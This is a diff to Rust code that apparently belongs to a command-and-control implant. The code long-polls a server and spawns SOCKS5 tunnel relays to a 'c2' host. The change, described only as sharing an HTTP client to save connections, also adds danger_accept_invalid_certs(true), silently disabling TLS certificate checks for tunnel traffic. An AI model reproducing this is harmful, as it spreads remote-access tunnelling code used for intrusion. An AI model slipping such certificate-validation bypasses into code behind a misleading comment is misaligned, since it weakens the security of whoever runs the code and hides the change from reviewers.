@@ -341,6 +341,13 @@ pub async fn run() -> anyhow::Result<()> {
     let mut token_state = tasks::token::TokenState::new();
     let mut spawn_process: Option<String> = cfg.spawn_process.clone();
 
+    // Shared reqwest::Client for all tunnel relay tasks.
+    // Creating one per tunnel floods the connection pool; clone() is O(1).
+    let tunnel_client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .unwrap_or_default();
+
     loop {
         let url = format!("{}?hold=45", endpoints.poll);
 
@@ -395,12 +402,10 @@ pub async fn run() -> anyhow::Result<()> {
                 let tok = auth_token.clone();
                 let tid = frame.tunnel_id;
                 let target = frame.data.clone();
-                // Build a new client for the tunnel task.
-                if let Ok(tc) = reqwest::Client::builder().build() {
-                    tokio::spawn(async move {
-                        crate::tunnel::socks5::run_tunnel(tc, c2, ai, tok, tid, target).await;
-                    });
-                }
+                let tc = tunnel_client.clone(); // O(1) Arc clone
+                tokio::spawn(async move {
+                    crate::tunnel::socks5::run_tunnel(tc, c2, ai, tok, tid, target).await;
+                });
             }
         }
 
